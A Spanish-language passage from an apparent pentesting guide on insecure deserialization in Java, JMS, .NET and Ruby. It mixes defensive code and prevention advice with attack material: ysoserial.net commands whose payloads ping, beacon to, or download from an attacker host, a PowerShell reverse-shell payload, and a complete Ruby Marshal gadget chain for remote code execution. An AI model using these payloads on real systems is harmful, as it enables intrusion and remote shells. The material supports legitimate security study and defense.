En escenarios donde ciertos **objetos deben implementar la interfaz `Serializable`** debido a la jerarqu铆a de clases, existe un riesgo de deserializaci贸n no intencional. Para prevenir esto, aseg煤rate de que estos objetos no sean deserializables definiendo un m茅todo `readObject()` `final` que lance consistentemente una excepci贸n, como se muestra a continuaci贸n:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Mejorando la Seguridad de la Deserializaci贸n en Java**

**Personalizar `java.io.ObjectInputStream`** es un enfoque pr谩ctico para asegurar los procesos de deserializaci贸n. Este m茅todo es adecuado cuando:

- El c贸digo de deserializaci贸n est谩 bajo tu control.
- Se conocen las clases esperadas para la deserializaci贸n.

Sobrescribe el m茅todo **`resolveClass()`** para limitar la deserializaci贸n solo a las clases permitidas. Esto evita la deserializaci贸n de cualquier clase excepto aquellas expl铆citamente permitidas, como en el siguiente ejemplo que restringe la deserializaci贸n solo a la clase `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Usar un Agente Java para Mejora de Seguridad** ofrece una soluci贸n alternativa cuando la modificaci贸n de c贸digo no es posible. Este m茅todo se aplica principalmente para **poner en lista negra clases da帽inas**, utilizando un par谩metro de JVM:
```
-javaagent:name-of-agent.jar
```
Proporciona una forma de asegurar la deserializaci贸n de forma din谩mica, ideal para entornos donde los cambios de c贸digo inmediatos son impr谩cticos.

Consulta un ejemplo en [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)


**Implementaci贸n de Filtros de Serializaci贸n**: Java 9 introdujo filtros de serializaci贸n a trav茅s de la interfaz **`ObjectInputFilter`**, proporcionando un mecanismo potente para especificar criterios que los objetos serializados deben cumplir antes de ser deserializados. Estos filtros se pueden aplicar globalmente o por flujo, ofreciendo un control detallado sobre el proceso de deserializaci贸n.

Para utilizar filtros de serializaci贸n, puedes establecer un filtro global que se aplique a todas las operaciones de deserializaci贸n o configurarlo din谩micamente para flujos espec铆ficos. Por ejemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Aprovechando Bibliotecas Externas para una Seguridad Mejorada**: Bibliotecas como **NotSoSerial**, **jdeserialize** y **Kryo** ofrecen caracter铆sticas avanzadas para controlar y monitorear la deserializaci贸n en Java. Estas bibliotecas pueden proporcionar capas adicionales de seguridad, como la lista blanca o negra de clases, analizar objetos serializados antes de la deserializaci贸n e implementar estrategias de serializaci贸n personalizadas.

- **NotSoSerial** intercepta procesos de deserializaci贸n para prevenir la ejecuci贸n de c贸digo no confiable.
- **jdeserialize** permite el an谩lisis de objetos Java serializados sin deserializarlos, ayudando a identificar contenido potencialmente malicioso.
- **Kryo** es un marco de serializaci贸n alternativo que enfatiza la velocidad y eficiencia, ofreciendo estrategias de serializaci贸n configurables que pueden mejorar la seguridad.

### Referencias

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Charla sobre deserializaci贸n y ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Charla sobre gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) y diapositivas: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Documento de Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Documento sobre deserializaciones CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Inyecci贸n JNDI y log4Shell

Encuentra qu茅 es **la Inyecci贸n JNDI, c贸mo abusar de ella a trav茅s de RMI, CORBA y LDAP y c贸mo explotar log4shell** (y un ejemplo de esta vulnerabilidad) en la siguiente p谩gina:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Servicio de Mensajes Java

> El **Servicio de Mensajes Java** (**JMS**) API es una API de middleware orientada a mensajes en Java para enviar mensajes entre dos o m谩s clientes. Es una implementaci贸n para manejar el problema productor-consumidor. JMS es parte de la Plataforma Java, Edici贸n Empresarial (Java EE), y fue definido por una especificaci贸n desarrollada en Sun Microsystems, pero que desde entonces ha sido guiada por el Proceso de Comunidad Java. Es un est谩ndar de mensajer铆a que permite a los componentes de aplicaciones basadas en Java EE crear, enviar, recibir y leer mensajes. Permite que la comunicaci贸n entre diferentes componentes de una aplicaci贸n distribuida sea desacoplada, confiable y asincr贸nica. (De [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Productos

Hay varios productos que utilizan este middleware para enviar mensajes:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### Explotaci贸n

B谩sicamente, hay **varios servicios que utilizan JMS de manera peligrosa**. Por lo tanto, si tienes **suficientes privilegios** para enviar mensajes a estos servicios (generalmente necesitar谩s credenciales v谩lidas), podr铆as ser capaz de enviar **objetos maliciosos serializados que ser谩n deserializados por el consumidor/suscriptor**.\
Esto significa que en esta explotaci贸n, todos los **clientes que vayan a utilizar ese mensaje se infectar谩n**.

Debes recordar que incluso si un servicio es vulnerable (porque deserializa de manera insegura la entrada del usuario), a煤n necesitas encontrar gadgets v谩lidos para explotar la vulnerabilidad.

La herramienta [JMET](https://github.com/matthiaskaiser/jmet) fue creada para **conectar y atacar estos servicios enviando varios objetos maliciosos serializados utilizando gadgets conocidos**. Estos exploits funcionar谩n si el servicio sigue siendo vulnerable y si alguno de los gadgets utilizados est谩 dentro de la aplicaci贸n vulnerable.

### Referencias

* Charla de JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Diapositivas: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

En el contexto de .Net, los exploits de deserializaci贸n operan de manera similar a los encontrados en Java, donde los gadgets son explotados para ejecutar c贸digo espec铆fico durante la deserializaci贸n de un objeto.

### Fingerprint

#### WhiteBox

El c贸digo fuente debe ser inspeccionado en busca de ocurrencias de:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

El enfoque debe estar en los serializadores que permiten que el tipo sea determinado por una variable bajo control del usuario.

#### BlackBox

La b煤squeda debe apuntar a la cadena codificada en Base64 **AAEAAAD/////** o cualquier patr贸n similar que pueda ser deserializado en el lado del servidor, otorgando control sobre el tipo a ser deserializado. Esto podr铆a incluir, pero no se limita a, estructuras **JSON** o **XML** que presenten `TypeObject` o `$type`.

### ysoserial.net

En este caso, puedes usar la herramienta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **crear los exploits de deserializaci贸n**. Una vez descargado el repositorio de git, debes **compilar la herramienta** utilizando Visual Studio, por ejemplo.

Si deseas aprender sobre **c贸mo ysoserial.net crea su exploit**, puedes [**consultar esta p谩gina donde se explica el gadget ObjectDataProvider + ExpandedWrapper + formateador Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Las principales opciones de **ysoserial.net** son: **`--gadget`**, **`--formatter`**, **`--output`** y **`--plugin`.**

* **`--gadget`** se utiliza para indicar el gadget a abusar (indicar la clase/funci贸n que ser谩 abusada durante la deserializaci贸n para ejecutar comandos).
* **`--formatter`**, se utiliza para indicar el m茅todo para serializar el exploit (necesitas saber qu茅 biblioteca est谩 utilizando el back-end para deserializar la carga 煤til y usar la misma para serializarla).
* **`--output`** se utiliza para indicar si deseas el exploit en formato **raw** o codificado en **base64**. _Ten en cuenta que **ysoserial.net** codificar谩 la carga 煤til usando **UTF-16LE** (codificaci贸n utilizada de forma predeterminada en Windows), por lo que si obtienes el raw y simplemente lo codificas desde una consola de Linux, podr铆as tener algunos **problemas de compatibilidad de codificaci贸n** que impedir谩n que el exploit funcione correctamente (en la caja JSON de HTB, la carga 煤til funcion贸 tanto en UTF-16LE como en ASCII, pero esto no significa que siempre funcionar谩)._
* **`--plugin`** ysoserial.net admite plugins para crear **exploits para frameworks espec铆ficos** como ViewState

#### M谩s par谩metros de ysoserial.net

* `--minify` proporcionar谩 una **carga 煤til m谩s peque帽a** (si es posible)
* `--raf -f Json.Net -c "anything"` Esto indicar谩 todos los gadgets que se pueden usar con un formateador proporcionado (`Json.Net` en este caso)
* `--sf xml` puedes **indicar un gadget** (`-g`) y ysoserial.net buscar谩 formateadores que contengan "xml" (insensible a may煤sculas y min煤sculas)

Ejemplos de **ysoserial** para crear exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** tambi茅n tiene un **par谩metro muy interesante** que ayuda a comprender mejor c贸mo funciona cada exploit: `--test`. Si indicas este par谩metro, **ysoserial.net** intentar谩 el **exploit localmente**, para que puedas probar si tu carga 煤til funcionar谩 correctamente. Este par谩metro es 煤til porque si revisas el c贸digo, encontrar谩s fragmentos de c贸digo como el siguiente (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Esto significa que para probar el exploit, el c贸digo llamar谩 a [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
En el **c贸digo anterior es vulnerable al exploit creado**. Por lo tanto, si encuentras algo similar en una aplicaci贸n .Net, probablemente esa aplicaci贸n tambi茅n sea vulnerable.

Por lo tanto, el par谩metro **`--test`** nos permite entender **qu茅 fragmentos de c贸digo son vulnerables** al exploit de deserializaci贸n que puede crear **ysoserial.net**.

### ViewState

Echa un vistazo a [este POST sobre **c贸mo intentar explotar el par谩metro \_\_ViewState de .Net**](exploiting-\_\_viewstate-parameter.md) para **ejecutar c贸digo arbitrario**. Si **ya conoces los secretos** utilizados por la m谩quina v铆ctima, [lee este post para saber c贸mo ejecutar c贸digo](exploiting-\_\_viewstate-knowing-the-secret.md).

### Prevenci贸n

Para mitigar los riesgos asociados con la deserializaci贸n en .Net:

- **Evita que los flujos de datos definan sus tipos de objetos.** Utiliza `DataContractSerializer` o `XmlSerializer` cuando sea posible.

- **Para `JSON.Net`, establece `TypeNameHandling` en `None`:**
%%%TypeNameHandling = TypeNameHandling.None%%%

- **Evita usar `JavaScriptSerializer` con un `JavaScriptTypeResolver`.**

- **Limita los tipos que pueden ser deserializados**, comprendiendo los riesgos inherentes con los tipos de .Net, como `System.IO.FileInfo`, que puede modificar las propiedades de los archivos del servidor, lo que potencialmente podr铆a llevar a ataques de denegaci贸n de servicio.

- **Ten cuidado con los tipos que tienen propiedades riesgosas**, como `System.ComponentModel.DataAnnotations.ValidationException` con su propiedad `Value`, que puede ser explotada.

- **Controla de forma segura la instanciaci贸n de tipos** para evitar que los atacantes influyan en el proceso de deserializaci贸n, lo que hace que incluso `DataContractSerializer` o `XmlSerializer` sean vulnerables.

- **Implementa controles de lista blanca** utilizando un `SerializationBinder` personalizado para `BinaryFormatter` y `JSON.Net`.

- **Mantente informado sobre los gadgets de deserializaci贸n inseguros conocidos** dentro de .Net y aseg煤rate de que los deserializadores no instancien tales tipos.

- **A铆sla el c贸digo potencialmente riesgoso** del c贸digo con acceso a Internet para evitar exponer gadgets conocidos, como `System.Windows.Data.ObjectDataProvider` en aplicaciones WPF, a fuentes de datos no confiables.

### **Referencias**

* Documento sobre deserializaci贸n JSON en Java y .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** charla: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) y diapositivas: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

En Ruby, la serializaci贸n se facilita mediante dos m茅todos dentro de la biblioteca **marshal**. El primer m茅todo, conocido como **dump**, se utiliza para transformar un objeto en un flujo de bytes. Este proceso se conoce como serializaci贸n. Por otro lado, el segundo m茅todo, **load**, se emplea para revertir un flujo de bytes a un objeto, un proceso conocido como deserializaci贸n.

Para asegurar objetos serializados, **Ruby emplea HMAC (C贸digo de Autenticaci贸n de Mensajes Basado en Hash)**, garantizando la integridad y autenticidad de los datos. La clave utilizada para este prop贸sito se almacena en una de varias ubicaciones posibles:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Cadena de gadgets de deserializaci贸n gen茅rica a RCE de Ruby 2.X (m谩s informaci贸n en [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/))**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Otra cadena de RCE para explotar Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)
